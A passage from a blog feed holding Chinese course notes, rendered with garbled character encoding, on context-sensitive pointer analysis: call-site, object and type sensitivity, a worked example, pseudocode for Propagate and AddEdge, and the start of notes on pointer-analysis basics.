id="Context-Sensitivity-Variantsï¼ˆImplementation-of-Select-ï¼‰"><a href="#Context-Sensitivity-Variantsï¼ˆImplementation-of-Select-ï¼‰" class="headerlink" title="Context Sensitivity Variantsï¼ˆImplementation of Select()ï¼‰"></a>Context Sensitivity Variantsï¼ˆImplementation of <code>Select()</code>ï¼‰</h1><p>å¯¹äºä¸Šä¸‹æ–‡æœ‰ä¸åŒçš„æŠ½è±¡è¡¨ç¤ºï¼Œå…¶ä¸­ä¸»è¦æœ‰ Call-site sensitivityï¼ŒObject sensitivity å’Œ Type sensitivityã€‚</p><h2 id="Call-Site-Sensitivity-k-CFA"><a href="#Call-Site-Sensitivity-k-CFA" class="headerlink" title="Call-Site Sensitivity(k-CFA)"></a>Call-Site Sensitivity(k-CFA)</h2><p>è°ƒç”¨ç‚¹æ•æ„Ÿ [1]ä¸Šä¸‹æ–‡ç”±è°ƒç”¨ç‚¹è¡Œå·å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼Œå³ä¸Šä¸‹æ–‡æœ¬è´¨ä¸Šæ˜¯è°ƒç”¨æ ˆçš„æŠ½è±¡ï¼š</p><script type="math/tex; mode=display">Select(\boldsymbol{c},\boldsymbol{l},\_)=[l',\dots,l'',l]\\\text{where }c=[l',\dots,l'']</script><p>ä¸Šå¼è¡¨ç¤ºäº†è°ƒç”¨ç‚¹æ•æ„Ÿçš„<code>select()</code>å‡½æ•°çš„å®ç°ï¼Œå³å½“å‰ä¸Šä¸‹æ–‡ $c$ çš„ $l$ è¡Œå‘ç”Ÿäº†è°ƒç”¨ï¼Œé‚£ä¹ˆè°ƒç”¨è¿›çš„ä¸Šä¸‹æ–‡ä¸º$[c,l]$</p><p>ä½†ç¢°åˆ°é€’å½’è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡ä¼šæ— é™çš„å¢åŠ ï¼Œæ­¤æ—¶éœ€è¦è§†ä¸Šä¸‹æ–‡ä¸ºé˜Ÿåˆ—ï¼Œå¹¶é™åˆ¶é˜Ÿåˆ—é•¿åº¦$k$ï¼ˆå› æ­¤æ­¤æ–¹æ³•ä¹Ÿå« k-CFA, control flow analysisï¼‰ï¼Œå®é™…åº”ç”¨æ—¶ï¼Œ$k \leq 3$ï¼Œä¸”å‡½æ•°ä¸Šä¸‹æ–‡é•¿åº¦å’Œå †ä¸Šä¸‹æ–‡é•¿åº¦å¯ä»¥ä¸ä¸€è‡´ï¼Œç›®å‰æ•ˆæœæœ€å¥½çš„æ˜¯å‡½æ•°ä¸Šä¸‹æ–‡é•¿åº¦ä¸º $k=2$ è€Œå †ä¸Šä¸‹æ–‡é•¿åº¦ä¸º $k=1$ã€‚</p><p>é‚£ä¹ˆç‰¹åˆ«çš„ï¼Œ</p><ul><li>0-call-site/CFAä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼›</li><li>1-call-site/CFA å¯ä»¥è¡¨ç¤ºä¸º $Select(c,l,_)=[l]$ï¼Œæ³¨æ„åˆ° $c$ è¢«ä¸¢å¼ƒ</li><li><p>2-call-site/CFA å¯ä»¥è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">  Select(c,l,_)=[l'',l]\\    where c=[l',l'']</script><p>  æ³¨æ„åˆ°ç¬¬ä¸€ä¸ª$lâ€™$è¢«ä¸¢å¼ƒã€‚</p></li></ul><p>å¯ä»¥çœ‹å‡ºï¼Œ$k$ çš„å€¼è¶Šé•¿æ•ˆæœè¶Šå‡†ç¡®ï¼Œä½†æ˜¯æ•ˆç‡è¶Šä½ã€‚</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè“åº•ä»£ç ä¸ºå¾…åˆ†æä»£ç ï¼Œæ³¨æ„ä»£ç ä¸­æ²¡æœ‰storeå’Œloadè¯­å¥å› æ­¤ä¸éœ€è¦çœ‹è¿™ä¸¤ä¸ªè¯­å¥çš„å¤„ç†ï¼Œå¹¶ä¸”ä¸è€ƒè™‘heap sensitiveï¼š</p><p>åˆå§‹åŒ–é˜¶æ®µï¼Œ<strong>å¤„ç†<code>main()</code>å‡½æ•°ï¼š</strong><br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902201538441.png" alt="image-20200902201538441" style="zoom:60%;"></p><p>å°† $[]:C.main()$ åŠ å…¥ RM é›†åˆï¼Œå› ä¸ºå‡½æ•°å­˜åœ¨newè¯­å¥ï¼Œå°†$\langle []:c, \{o_3\}\rangle$ åŠ å…¥WLï¼›</p><p>å¾ªç¯å¤„ç†WLï¼Œ<strong>å¤„ç†$\langle []:c, \{o_3\}\rangle$</strong>ï¼š</p><ul><li>æ‰§è¡Œ$Propagate()$ï¼Œæ›´æ–°PFG</li><li>æ³¨æ„åˆ°è¯­å¥ä¸­å­˜åœ¨<code>c.m()</code>æ‰§è¡Œ$ProcessCall([]:c,o_3)$<ul><li>$select()$ç»™å‡º$c^t=[4]$</li><li>ä¼ thisï¼Œå°†$\langle [4]:m_{this}, \{o_3\}\rangle$ åŠ å…¥ $WL$</li><li>CGä¸­æ¥å…¥è°ƒç”¨è¾¹ $[]:4\rightarrow[4]:C.m()$ </li><li>æ‰§è¡Œ$AddReachable([4]:C.m())$<ul><li>$[4]:C.m()$åŠ å…¥$RM$</li><li>å› ä¸º<code>m()</code>å‡½æ•°ä¸­å­˜åœ¨newè¯­å¥ï¼Œå°†<code>n1</code>ï¼Œ<code>n2</code>åŠ å…¥WL</li></ul></li></ul></li></ul><p>å¤„ç†ç»“æœå¦‚ä¸‹ï¼š</p><ul><li><p>WLï¼š$\left[\langle c^t:m_{this}, \{o_3\}\rangle, \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle\right]$</p></li><li><p>CGï¼š$\{[]:4\rightarrow[4]:C.m()\}$</p></li><li><p>RMï¼š$\{ []:C.main(), [4]:C.m()\}$</p></li><li><p>PFGï¼š</p><pre class="mermaid">  graph LR_c("[]:c â†’ {o3}")4_cm_this("[4]:C.m_this â†’ {}")</pre></li></ul><p><strong>å¤„ç†$\langle[4]:C.m_{this},\{o_3\}\rangle$ï¼š</strong></p><ul><li><p>æ‰§è¡Œ$Propagate()$ï¼Œæ›´æ–°PFGï¼Œ$[4]:C.m_{this}$</p></li><li><p>æ³¨æ„åˆ°å­˜åœ¨<code>x=this.id(n1)</code>ï¼Œæ‰§è¡Œ$ProcessCall([4]:C.m_{this}, o_3)$</p><ul><li>$select()$ç»™å‡º$c^t=[14]$</li></ul></li><li><p>æ·»åŠ $\langle [14]:m_{this}, \{o_3\}\rangle$è‡³$WL$</p><ul><li>CGä¸­æ¥å…¥è°ƒç”¨è¾¹ $[4]:14\rightarrow[14]:C.id(Number)$ </li></ul></li><li><p>æ‰§è¡Œ$AddReachable([]:C.m())$  </p><ul><li>$[14]:C.id(Number)$åŠ å…¥$RM$</li><li>æ·»åŠ å‚æ•°è¾¹è‡³ $PFG$</li></ul></li><li><p>æ·»åŠ è¿”å›å€¼è¾¹è‡³ $PFG$</p></li><li><p>æ³¨æ„åˆ°å­˜åœ¨<code>y=this.id(n2)</code>ï¼Œæ‰§è¡Œ$ProcessCall([4]:C.m_{this}, o_3)$ï¼Œå¤„ç†æ–¹å¼åŒä¸Š</p></li></ul><p>å¤„ç†ç»“æœå¦‚ä¸‹</p><ul><li><p>WLï¼š$\left[ \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle, \langle [14]:m_{this}, \{o_3\}\rangle \right]$</p></li><li><p>CGï¼š$\{[]:4\rightarrow[4]:C.m(), [4]:14\rightarrow[14]:C.id(Number), [4]:15\rightarrow[15]:C.id(Number)\}$</p></li><li><p>RMï¼š$\{ []:C.main(), [4]:C.m(), [14]:C.id(Number), [15]:C.id(Number)\}$</p></li><li><p>PFGï¼š</p><pre class="mermaid">  graph LR_c("[]:c â†’ {o3}")4cm_this("[4]:C.m_this â†’ {o3}")4_n1("[4]:n1 â†’ {}") --> 14_n("[14]:n â†’ {}")14_n-->4_x("[4]:x â†’ {}")4_n2("[4]:n2 â†’ {}") --> 15_n("[15]:n â†’ {}")15_n-->4_y("[4]:y â†’ {}")</pre></li></ul><p>åç»­åˆ†æè¾ƒä¸ºç®€å•ï¼Œä¸å†è®°å½•ï¼Œæœ€ç»ˆç»“æœä¸ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902212048049.png" alt="image-20200902212048049"></p><h2 id="Object-Sensitivity"><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h2><p>å¯¹è±¡æ•æ„Ÿ[2]çš„ä¸Šä¸‹æ–‡ç”±è°ƒç”¨è€…å¯¹è±¡å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼š</p><script type="math/tex; mode=display">\begin{array}{c}\operatorname{Select}\left(\_,\_, \boldsymbol{c}^{\prime}: \boldsymbol{o}_{\boldsymbol{i}}\right)=\left[o_{j}, \ldots, o_{k}, o_{i}\right] \\\text { where } c^{\prime}=\left[o_{j}, \ldots, o_{k}\right]\end{array}</script><p>ä¸¾ä¾‹æ¥è¯´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213056427.png" alt="image-20200902213056427"></p><p>å¯¹äºç¬¬5è¡Œä»£ç è°ƒç”¨åï¼Œ1-objectçš„ä¸Šä¸‹æ–‡è§£æä¸º$[o_1]$ï¼Œå¯è§å¯¹äºç¬¬ 7 è¡Œçš„æŒ‡é’ˆåˆ†æè€Œè¨€ï¼Œ1-objectæ•ˆæœä¼˜äº1-call-siteï¼›</p><p>ä»è°ƒç”¨å›¾ä¹Ÿå¯çœ‹å‡ºåˆ†åˆ«ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213307436.png" alt="image-20200902213307436"></p><p>Object Sensitivityç†è®ºä¸Šå¹¶ä¸ä¼˜äºCall Siteï¼Œå¦‚å…ˆå‰ä¾‹å­Objectå¼±äºCall Siteï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200902213557030.png" alt="image-20200902213557030"></p><h2 id="Type-Sensitivity"><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h2><p>ç±»å‹æ•æ„Ÿ[3]çš„ä¸Šä¸‹æ–‡ç”±è°ƒç”¨ç‚¹ç±»å’Œå…ˆå‰ä¸Šä¸‹æ–‡ç»„æˆï¼š</p><script type="math/tex; mode=display">\operatorname{Select}\left(\_, \_, \_, m\right)=\left[t^{\prime}, \ldots, t^{\prime \prime}, \operatorname{InType}\left(m\right)\right] \\\text{where }c^{\prime}=\left[t^{\prime}, \ldots, t^{\prime \prime}\right]</script><p>æ³¨æ„è¿™é‡Œç¬”è®°æ”¹äº†ä¸€ä¸‹è€å¸ˆçš„å…¬å¼ï¼Œè¿™é‡Œ $Select()$ çš„å‚æ•° $m$ æŒ‡callerï¼Œ$InType()$ ä¸ºè·å–callerç±»åçš„å‡½æ•°ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200903204348536.png" alt="image-20200903204348536"></p><p>å¯¹äºç¬¬3ã€5ã€7è¡Œçš„è°ƒç”¨ï¼Œ1-Typeçš„ç»“æœä¸º$[X]$â€”â€”å› ä¸º<code>main()</code>æ–¹æ³•å±äº <code>X</code> ç±»ã€‚ä¸éš¾çœ‹å‡ºï¼ŒType-sensitivityæ˜¯ Object-sensistivityçš„å†ä¸€æ¬¡æŠ½è±¡ï¼Œæé«˜é€Ÿåº¦è€Œé™ä½äº†ç²¾åº¦ï¼ˆæ•ˆæœ&lt;=Object-sensitivityï¼‰ã€‚</p><h2 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><p>åœ¨ææ¨¾ã€è°­æ·»è€å¸ˆçš„è®ºæ–‡[4]ä¸­ï¼Œå¯¹æ¯”äº†ä¸‰è€…çš„æ•ˆç‡å’Œç²¾åº¦ï¼Œmay-fail-cast æŒ‡å¼ºåˆ¶è½¬æ¢å‡ºé”™çš„æ¬¡æ•°ï¼Œç²¾åº¦è¶Šé«˜å‡ºé”™æ¬¡æ•°ä¼šè¶Šå°‘ï¼Œcall-graph-edge æŒ‡äº§ç”Ÿçš„è°ƒç”¨å›¾è¾¹æ•°ï¼Œç²¾åº¦è¶Šé«˜è¾¹è¶Šå°‘ã€‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200903205546848.png" alt="image-20200903205546848"></p><p>å¯ä»¥çœ‹å‡ºï¼Œä»å‡†ç¡®ç‡è§’åº¦ï¼Œå¯¹è±¡æ•æ„Ÿæœ€å‡†ç¡®ï¼›ä»æ•ˆç‡è§’åº¦ï¼Œç±»å‹æ•æ„Ÿæ•ˆç‡æœ€é«˜ï¼Œè€Œå¯¹äºé¢å‘å¯¹è±¡çš„ Java è¯­è¨€ï¼Œcall-siteæ•ˆæœæœ€å·®ã€‚</p><p>é¡ºå¸¦ä¸€æçš„æ˜¯ï¼Œè®ºæ–‡[4]ä¸­ä»‹ç»äº†ä¸€ç§æ–°ç®—æ³•ï¼Œå› ä¸ºç¨‹åºåˆ†æåœ¨å¤§å¤šæ—¶å€™ä¸éœ€è¦ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå› æ­¤åªåœ¨éœ€è¦ä¸Šä¸‹æ–‡æ•æ„Ÿå¤„ä½¿ç”¨å‡†ç¡®çš„Objectåˆ†æï¼Œå°±å¯ä»¥æ—¢ä¿è¯ç²¾åº¦åˆæœ‰è¶³å¤Ÿçš„é€Ÿåº¦ã€‚</p><h1 id="Propagate-AddEdge-and-Dispatch"><a href="#Propagate-AddEdge-and-Dispatch" class="headerlink" title="Propagate(), AddEdge() and Dispatch()"></a>Propagate(), AddEdge() and Dispatch()</h1><p>Propagate():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: æŒ‡é’ˆn</span></span><br><span class="line"><span class="string">    pts: nå¯èƒ½æŒ‡å‘çš„æ–°çš„æŒ‡é’ˆé›†åˆ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) â‹ƒ= pts <span class="comment"># å°†ptså†…å®¹å­˜å…¥åˆ°æŒ‡é’ˆæŒ‡å‘çš„é›†åˆä¸­</span></span><br><span class="line">        <span class="keyword">for</span> each n â†’ s âˆˆ PFG</span><br><span class="line">            add s, pts to WL</span><br></pre></td></tr></table></figure><p>AddEdge():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s â†’ t âˆ‰ PFG:</span><br><span class="line">        add s â†’ t to PFG  <span class="comment"># å°†s â†’ tåŠ å…¥PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># å°†&lt;t,sæŒ‡å‘å†…å®¹&gt;åŠ å…¥å·¥ä½œé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><p>Dispatch()ï¼š</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><h1 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h1><p>åœ¨åŒ—å¤§è¯¾ç¨‹ä¸­è¿˜ä»‹ç»äº†ä¸¤ç§æŒ‡é’ˆåˆ†ææ–¹æ³•</p><ul><li>AndersonæŒ‡å‘åˆ†æ[5]ï¼Œå¤æ‚åº¦$O(n^3)$ï¼ˆnä¸ºå˜é‡ä¸ªæ•°ï¼‰ï¼Œä¹Ÿå« Inclusion-basedï¼Œæœ¬è¯¾ç¨‹ä»‹ç»CFAä¸ä¹‹ç±»ä¼¼ï¼›</li><li>SteensgaardæŒ‡å‘åˆ†æï¼Œå¤æ‚åº¦ä¸º$O(n\alpha(n))$ï¼ˆnä¸ºè¯­å¥æ•°ï¼Œæ¥è¿‘çº¿æ€§æ—¶é—´ï¼‰ï¼Œä¹Ÿå«Unification-basedã€‚</li></ul><p>è¿˜æœ‰ä¸€ç§æµæ•æ„Ÿçš„æŒ‡é’ˆåˆ†æç®—æ³•[6]ï¼Œå…¶åˆ©ç”¨éƒ¨åˆ†SSAåšæŒ‡é’ˆåˆ†æçš„ä¼˜åŒ–ï¼Œæé«˜åˆ†æé€Ÿåº¦ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Olin Shivers, 1991. â€œControl-Flow Analysis of Higher-Order Languagesâ€. Ph.D. Dissertation. Carnegie Mellon University.</li><li>Ana Milanova, Atanas Rountev, and Barbara G. Ryder. â€œParameterized Object Sensitivity for Points-to and Side-Effect Analyses for Javaâ€. ISSTA 2002.</li><li>Yannis Smaragdakis, Martin Bravenboer, and Ondrej LhotÃ¡k. â€œPick Your Contexts Well: Understanding Object-Sensitivityâ€. POPL 2011.</li><li>Yue Li, Tian Tan, Anders MÃ¸ller, and Yannis Smaragdakis. â€œA Principled Approach to Selective Context Sensitivity for Pointer Analysisâ€. TOPLAS 2020.</li><li>The Ant and the Grasshopper: Fast and Accurate Pointer Analysis for Millions of Lines of Code, Hardekopf and Lin, PLDI 2007</li><li>Hardekopf B, Lin C. Flow-sensitive pointer analysis for millions of lines of code. CGO 2011:289-298.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;h2 id=&quot;Problem-of-Context-Insensitive-C-I&quot;&gt;&lt;a href=&quot;#Problem-of-Context-Insensitive-C-I&quot; class=&quot;headerlink&quot; title=&quot;Problem of Context-Insensitive (C.I.)&quot;&gt;&lt;/a&gt;Problem of Context-Insensitive (C.I.)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨çš„ä¸Šä¸‹æ–‡ä¸ä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;åœ¨ä¸åŒçš„è°ƒç”¨ä¸Šä¸‹æ–‡é‡Œï¼Œå‡½æ•°å†…çš„å˜é‡ä¼šæŒ‡å‘ä¸åŒï¼›&lt;/li&gt;
&lt;li&gt;åœ¨ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸­ï¼Œå‡½æ•°å†…çš„å¯¹è±¡æŒ‡å‘çš„å†…å®¹æ˜¯ä¸åŒä¸Šä¸‹æ–‡æ··åˆèµ·æ¥çš„ï¼ˆå¦‚ä¸Šä¾‹ä¸­ $n$ æŒ‡å‘ $o_1$ å’Œ $o_2$ï¼‰ï¼Œè€Œè¿™äº›å†…å®¹ä¼šåå‘ä¼ æ’­ï¼Œé€ æˆæ›´å¤šä¸å‡†ç¡®çš„ç»“æœã€‚&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="è¿‡ç¨‹é—´åˆ†æ" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/</id>
    <published>2020-08-18T13:22:13.000Z</published>
    <updated>2020-10-04T03:41:48.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>CHA åªçœ‹å®šä¹‰ç±»å‹ï¼Œä¼šå¾—åˆ°å¾ˆå¤šå®é™…ä¸è¢«è°ƒç”¨çš„å­ç±»æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCHAçš„å¸¸é‡åˆ†ææ—¶åªèƒ½å¾—åˆ°NAC</p><p>è€ŒæŒ‡é’ˆåˆ†æä¼šå¾—åˆ°æ›´ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200818213708639.png" alt="image-20200818213708639"></p><h1 id="Introduction-to-Pointer-Analysis"><a href="#Introduction-to-Pointer-Analysis" class="headerlink" title="Introduction to Pointer Analysis"></a>Introduction to Pointer Analysis</h1><blockquote><p>A fundamental static analysis, computes which memory locations a pointer can point to.</p><p>For object-oriented programs, computes which objects a pointer (variable or field) can point to.</p></blockquote><a id="more"></a><p>å³æŒ‡é’ˆåˆ†æ[1]ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆç©¶ç«ŸæŒ‡å‘å“ªä¸€å—å†…å­˜ï¼Œå¯¹äºé¢å‘å¯¹è±¡ç¨‹åºï¼ŒæŒ‡é’ˆåˆ†æå¯ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå˜é‡æˆ–è€…åŸŸã€‚</p><p>æŒ‡é’ˆåˆ†ææ˜¯mayåˆ†æã€‚</p><h2 id="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"><a href="#æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ" class="headerlink" title="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"></a>æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ</h2><ul><li><p>æŒ‡é’ˆåˆ†æå›ç­”æŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li><li><p>åˆ«ååˆ†æå›ç­”ä¸¤ä¸ªæŒ‡é’ˆæ˜¯å¦æŒ‡å‘åŒä¸€å¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li></ul><h2 id="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"><a href="#æŒ‡é’ˆåˆ†æçš„åº”ç”¨" class="headerlink" title="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"></a>æŒ‡é’ˆåˆ†æçš„åº”ç”¨</h2><ul><li>åŸºç¡€ä¿¡æ¯æ„å»º<ul><li>Call graphã€åˆ«ååˆ†æ</li></ul></li><li>ç¼–è¯‘å™¨ä¼˜åŒ–</li><li>Bugæ£€æµ‹<ul><li>ç©ºæŒ‡é’ˆå¼‚å¸¸</li></ul></li><li>å®‰å…¨åˆ†æ<ul><li>ä¿¡æ¯æµåˆ†æ</li></ul></li></ul><h1 id="Key-Factors-of-Pointer-Analysis"><a href="#Key-Factors-of-Pointer-Analysis" class="headerlink" title="Key Factors of Pointer Analysis"></a>Key Factors of Pointer Analysis</h1><p>æŒ‡é’ˆåˆ†ææ˜¯ä¸€ä¸ªå¤æ‚ç³»ç»Ÿï¼Œå¾ˆå¤šå› ç´ å½±å“äº†æŒ‡é’ˆåˆ†æçš„å‡†ç¡®åº¦å’Œæ•ˆç‡ï¼š</p><div class="table-container"><table><thead><tr><th>Factor</th><th>Problem</th><th>Choice</th></tr></thead><tbody><tr><td>Heap abstraction</td><td>å¦‚ä½•å¯¹å †å†…å­˜å»ºæ¨¡</td><td>1. Allocation site*; 2. Storeless</td></tr><tr><td>Context sensitivity</td><td>æ˜¯å¦ä¸Šä¸‹æ–‡æ•æ„Ÿ</td><td>1. Context-sensitive*; 2. Context-insensitive*</td></tr><tr><td>Flow sensitivity</td><td>æ˜¯å¦æµæ•æ„Ÿ</td><td>1. Flow-sensitive; 2. Flow-insensitive*</td></tr><tr><td>Analysis scope</td><td>åˆ†æèŒƒå›´</td><td>1. Whole-program*; 2. Demand-driven</td></tr></tbody></table></div><p>æ‰“â€œ*â€å·çš„ä¸ºæœ¬è¯¾ç¨‹ä»‹ç»çš„åˆ†ææ–¹æ³•ã€‚</p><h2 id="Heap-Abstraction-å †æŠ½è±¡"><a href="#Heap-Abstraction-å †æŠ½è±¡" class="headerlink" title="Heap Abstraction(å †æŠ½è±¡)"></a>Heap Abstraction(å †æŠ½è±¡)</h2><p>åœ¨é™æ€åˆ†æè§†è§’ä¸­ï¼Œç¨‹åºä¸­ä¼šåˆ›å»ºæ— é™æ•°é‡çš„å¯¹è±¡å®ä¾‹ï¼ˆè€ƒè™‘åˆ°éš¾ä»¥åˆ†æå¾ªç¯/é€’å½’ç»ˆæ­¢æ¡ä»¶ï¼‰ï¼Œä¸ºäº†ä¿è¯æŒ‡é’ˆåˆ†æèƒ½å¤Ÿç»ˆæ­¢ï¼Œéœ€è¦å°†æ— é™æ•°é‡çš„å¯¹è±¡æŠ½è±¡ä¸ºæœ‰é™æ•°é‡çš„å¯¹è±¡<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820210803574.png" alt="image-20200820210803574"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰ä¸¤å¤§æµæ´¾[2]ï¼š</p><ul><li>Store based model</li><li>Storeless model</li></ul><p>å…¶ä¸­ï¼ŒStore based model ä¸­çš„ Allocation sites è¾ƒä¸ºå¸¸ç”¨ï¼Œå…¶æŠ½è±¡ä¾æ®æ˜¯åŒä¸€åˆ›å»ºç‚¹çš„å¯¹è±¡ä¸ºåŒä¸€å¯¹è±¡ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211117510.png" alt="image-20200820211117510"></p><h2 id="ä¸Šä¸‹æ–‡æ•æ„Ÿ"><a href="#ä¸Šä¸‹æ–‡æ•æ„Ÿ" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„Ÿ"></a>ä¸Šä¸‹æ–‡æ•æ„Ÿ</h2><p>æŒ‡é’ˆåˆ†æè¿‡ç¨‹ä¸­å¦‚ä½•å¯¹è°ƒç”¨ä¸Šä¸‹æ–‡å»ºæ¨¡ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§</p><ul><li>ä¸Šä¸‹æ–‡æ•æ„Ÿ<ul><li>æ¯ä¸€ä¸ªä¸Šä¸‹æ–‡åˆ†æä¸€æ¬¡ </li><li>æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œä¸åŒä¸Šä¸‹æ–‡æ–¹æ³•å¯¹è±¡ä¸ä¸€æ 